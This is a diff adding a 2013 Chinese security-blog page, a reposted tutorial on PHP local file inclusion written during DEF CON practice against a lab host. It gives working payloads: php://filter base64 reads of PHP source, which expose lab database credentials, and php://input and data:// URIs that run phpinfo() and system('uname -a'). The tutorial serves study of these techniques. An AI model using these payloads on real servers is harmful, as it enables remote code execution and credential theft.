@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+  <title>php LFI读php文件源码以及直接post webshell | Blog of Secer</title>
+  <meta name="description" content="" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="MobileOptimized" content="320" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
+  <link rel="stylesheet" type="text/css" href="/css/style.css" />
+  <meta name="generator" content="Blog of Secer">
+
+  
+  
+  
+
+  
+</head>
+
+<!--
+<body class="post-template">
+-->
+<body class="home-template">
+<div id="perspective" class="perspective effect-movedown">
+  <div class="container">
+    <!-- wrapper -->
+    <div class="wrapper">
+
+      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
+    <div class="vertical">
+        <div class="site-head-content inner">
+             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
+            <h1 class="blog-title">Blog of Secer</h1>
+            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
+        </div>
+    </div>
+</header>
+
+      
+
+<main class="content" role="main">
+  <article class="post">
+    <span class="post-meta">
+      <time datetime="2013-05-31T11:41:04.000Z" itemprop="datePublished">
+          2013-05-31
+      </time>
+    
+    
+    | 
+    <a href='/tag/DedeCMS/'>DedeCMS</a>,
+    
+    <a href='/tag/defcon/'>defcon</a>,
+    
+    <a href='/tag/LFI/'>LFI</a>
+    
+    
+</span>
+    <h1 class="post-title">php LFI读php文件源码以及直接post webshell</h1>
+    <section class="post-content">
+      <p>最近在忙<a href="http://Ha.Cker.In/tag/defcon" target="_blank">defcon</a>的题目集训 其中有一套题目里 有个老外写的writeup中提到了LFI的另一种小技巧</p>  <p>原文请参考 <a href="http://ddxhunter.wordpress.com/2010/03/10/lfis-exploitation-techniques/" target="_blank" rel="external">http://ddxhunter.wordpress.com/2010/03/10/lfis-exploitation-techniques/</a></p>  <p>PS: 该技巧并不是新的技术 神牛肯定已经用得觉得无聊了 所以当路过就行了 =_,=~ </p>  <p>我等小菜仅仅当做自己知识的补充~ （默默蹲墙角ing~）</p>  <p>假设如下一个场景   <table cellspacing="0" cellpadding="0" border="0"><tbody>       <tr>         <td>&#160;</td>          <td width="667">           <p>(1) <a href="http://vulnerable/fileincl/example1.php?page=intro.php" target="_blank" rel="external">http://vulnerable/fileincl/example1.php?page=intro.php</a>（该php文件包含LFI漏洞)&#160; </p>            <p>(2) 但是你没有地方可以upload你的webshell代码</p>            <p>(3) LFI只能读取到非php文件的源码（因为无法解析执行 只能被爆菊花）</p>            <p>(4) 如果你能读取到config.php之类文件 或许可以直接拿到数据库账号远程入侵进去</p>            <p>【现在的问题是】 LFI如何读取到php文件的源码?</p>         </td>       </tr>     </tbody></table> </p>  <p>于是给大家做个演示 如果我正常用<a href="http://Ha.Cker.In/tag/LFI" target="_blank">LFI</a>去读/sqli/db.php文件 是无法读取它的源码 它会被当做php文件被执行    <table cellspacing="0" cellpadding="0" border="0"><tbody>       <tr>         <td>&#160;</td>          <td width="667">           <p><a href="http://vulnerable/fileincl/example1.php?page=../sqli/db.php" target="_blank" rel="external">http://vulnerable/fileincl/example1.php?page=../sqli/db.php</a></p>         </td>       </tr>     </tbody></table> </p>  <p><a href="http://img.cker.in/phpLFIphppostwebshell_30FD/clip_image001.jpg" target="_blank" rel="external"><img title="clip_image001" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="201" alt="clip_image001" src="http://img.cker.in/phpLFIphppostwebshell_30FD/clip_image001_thumb.jpg" width="656" border="0"></a></p>  <p>但是如果我用老外文章里说提到的方法 就能把指定php文件的源码以base64方式编码并被显示出来   <table cellspacing="0" cellpadding="0" border="0"><tbody>       <tr>         <td>&#160;</td>          <td width="667">           <p><a href="http://vulnerable/fileincl/example1.php?page=php://filter/read=convert.base64-encode/resource=../sqli/db.php" target="_blank" rel="external">http://vulnerable/fileincl/example1.php?page=php://filter/read=convert.base64-encode/resource=../sqli/db.php</a></p>         </td>       </tr>     </tbody></table> </p>  <p><a href="http://img.cker.in/phpLFIphppostwebshell_30FD/clip_image003.jpg" target="_blank" rel="external"><img title="clip_image003" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="180" alt="clip_image003" src="http://img.cker.in/phpLFIphppostwebshell_30FD/clip_image003_thumb.jpg" width="778" border="0"></a></p>  <p>/sqli/db.php源码base64编码后的内容显示如下   <table cellspacing="0" cellpadding="0" border="0"><tbody>       <tr>         <td>           <p>1</p>         </td>          <td width="667">           <p>PD9waHAgCiAgJGxuayA9IG15c3FsX2Nvbm5lY3QoImxvY2FsaG9zdCIsICJwZW50ZXN0ZXJsYWIiLCAicGVudGVzdGVybGFiIik7CiAgJGRiID0gbXlzcWxfc2VsZWN0X2RiKCdleGVyY2lzZXMnLCAkbG5rKTsKPz4K</p>         </td>       </tr>     </tbody></table> </p>  <p>然后我们再去进行base64解码 解码后/sqli/db.php文件的源码一览无遗</p>  <p><a href="http://img.cker.in/phpLFIphppostwebshell_30FD/clip_image004.jpg" target="_blank" rel="external"><img title="clip_image004" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="394" alt="clip_image004" src="http://img.cker.in/phpLFIphppostwebshell_30FD/clip_image004_thumb.jpg" width="598" border="0"></a></p>  <p>看上去好像很厉害的样子…… 但是 =_,=||~ 再继续看下文~</p><br><a id="more"></a><br><p></p>  <p><strong><strong><strong><strong><em>*</em></strong></strong></strong></strong> 我是邪恶的分割线 <strong><strong><strong><strong><em>*</em></strong></strong></strong></strong></p>  <p>被 @扣子牛 bs了一番 又学到新的小技巧</p>  <p>【技巧】php://input 和 data:</p>  <p>php://input 详情可以参考</p>  <p><a href="http://zerofreak.blogspot.jp/2012/04/lfi-exploitation-via-phpinput-shelling.html" target="_blank" rel="external">http://zerofreak.blogspot.jp/2012/04/lfi-exploitation-via-phpinput-shelling.html</a></p>  <p>【条件】在allow_url_include = On 且 PHP &gt;= 5.2.0</p>  <p>【优势】直接POST php代码并执行</p>  <p>【鸡肋】在allow_url_include = On 传说中就可以直接RFI了 不过没有vps的童鞋可以这样玩比较方便</p>  <p>在上面提到的同一个LFI漏洞点 我们又要来爆它一次菊花   <table cellspacing="0" cellpadding="0" border="0"><tbody>       <tr>         <td>&#160;</td>          <td width="667">           <p><a href="http://vulnerable/fileincl/example1.php?page=intro.php" target="_blank" rel="external">http://vulnerable/fileincl/example1.php?page=intro.php</a></p>         </td>       </tr>     </tbody></table> </p>  <p>访问如下URL并用burp直接修改HTTP包 追加php命令代码   <table cellspacing="0" cellpadding="0" border="0"><tbody>       <tr>         <td>&#160;</td>          <td width="667">           <p><a href="http://vulnerable/fileincl/example1.php?page=php://input" target="_blank" rel="external">http://vulnerable/fileincl/example1.php?page=php://input</a></p>         </td>       </tr>     </tbody></table> </p>  <p><a href="http://img.cker.in/phpLFIphppostwebshell_30FD/clip_image005.jpg" target="_blank" rel="external"><img title="clip_image005" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="307" alt="clip_image005" src="http://img.cker.in/phpLFIphppostwebshell_30FD/clip_image005_thumb.jpg" width="538" border="0"></a></p>  <p>然后某君再一次被爆菊 &gt;_&lt;!~ (对不起~)</p>  <p><a href="http://img.cker.in/phpLFIphppostwebshell_30FD/clip_image007.jpg" target="_blank" rel="external"><img title="clip_image007" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="255" alt="clip_image007" src="http://img.cker.in/phpLFIphppostwebshell_30FD/clip_image007_thumb.jpg" width="660" border="0"></a></p>  <p>再换几种姿势继续&#160; data: 的方式   <table cellspacing="0" cellpadding="0" border="0"><tbody>       <tr>         <td width="38">&#160;</td>          <td width="688">           <p><a href="http://vulnerable/fileincl/example1.php?page=data://text/plain;base64" target="_blank" rel="external">http://vulnerable/fileincl/example1.php?page=data://text/plain;base64</a>,PD9waHBpbmZvKCk7Lyo=&#160;&#160; </p>            <p><a href="http://vulnerable/fileincl/example1.php?page=data:;base64" target="_blank" rel="external">http://vulnerable/fileincl/example1.php?page=data:;base64</a>,PD9waHBpbmZvKCk7Lyo=&#160; </p>            <p><a href="http://vulnerable/fileincl/example1.php?page=data:text/plain" target="_blank" rel="external">http://vulnerable/fileincl/example1.php?page=data:text/plain</a>,&lt;?php system(&quot;uname -a&quot;);?&gt;</p>         </td>       </tr>     </tbody></table> </p>  <p><a href="http://img.cker.in/phpLFIphppostwebshell_30FD/clip_image009.jpg" target="_blank" rel="external"><img title="clip_image009" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="204" alt="clip_image009" src="http://img.cker.in/phpLFIphppostwebshell_30FD/clip_image009_thumb.jpg" width="778" border="0"></a></p>  <p>剩下的大家再继续YY吧~</p>  <p>由于时间关系 我也木有时间去深入了解其原理</p>  <p>为了Hacker精神建议大家去深入研究下 &gt;_&lt;!~</p>  <p>&#160;</p>  <p>转自：<a href="http://hi.baidu.com/casperkid/item/2baf952b13a9cd0e76272cb0" target="_blank" rel="external">http://hi.baidu.com/casperkid/item/2baf952b13a9cd0e76272cb0</a></p>  <p>看老外的视频时候，文件包含时用“php://filter/read=convert.base64-encode/resource=../sqli/db.php”不是很懂，现在有点php基础算是搞清楚了。</p>  <p>另外<a href="http://Ha.Cker.In/tag/DedeCMS" target="_blank">DedeCMS</a>后门事件就用到了“php://input”。</p>
+    </section>
+    <footer class="post-footer">
+      <section class="author">
+    <h4>Secer</h4>
+    <p>记录互联网安全历程与个人成长经历</p>
+</section>
+      <section class="share">
+    <h4>Share this post</h4>
+    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://ha.cker.in/1002.seo/" target="_blank">
+        <span class="hidden">weibo</span>
+    </a>
+    <a class="icon-twitter" href="http://twitter.com/share?url=http://ha.cker.in/1002.seo/"
+       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <span class="hidden">Twitter</span>
+    </a>
+    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://ha.cker.in/1002.seo/"
+       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <span class="hidden">Facebook</span>
+    </a>
+    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://ha.cker.in/1002.seo/"
+       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+        <span class="hidden">Google+</span>
+    </a>
+</section>
+
+    </footer>
+  </article>
+  <nav class="pagination" role="pagination">
+    
+    <a class="newer-posts" href="/1003.seo/">
+        ← TNTHK小组内部版webshell密码破解解析
+    </a>
+    
+    <span class="icon-logo">•</span>
+    
+    <a class="older-posts" href="/1001.seo/">
+        Kali安装Parallels Tools教程 →
+    </a>
+    
+</nav>
+
+  <div id="comment" class="comments-area">
+    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
+    
+</div>
+
+</main>
+
+
+      
+<footer class="site-footer">
+  
+  <div class="inner">
+     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
+     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
+  </div>
+</footer>
+
+      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
+<script type="text/javascript" src="/js/index.js"></script>
+<script type="text/javascript" src="/js/menu.js"></script>
+
+
+
+
+
+  </div>
+</div>
+
+<nav  class="outer-nav top horizontal">
+
+          <a class="icon-home"  href="/"><span>Home</span></a>
+
+          <a class="icon-news"  href="/archives"><span>Archive</span></a>
+
+          <a class="icon-image"  href="/images"><span>Images</span></a>
+
+          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
+
+          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
+
+          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
+
+</nav>
+
+</div>
+</body>
+</html>
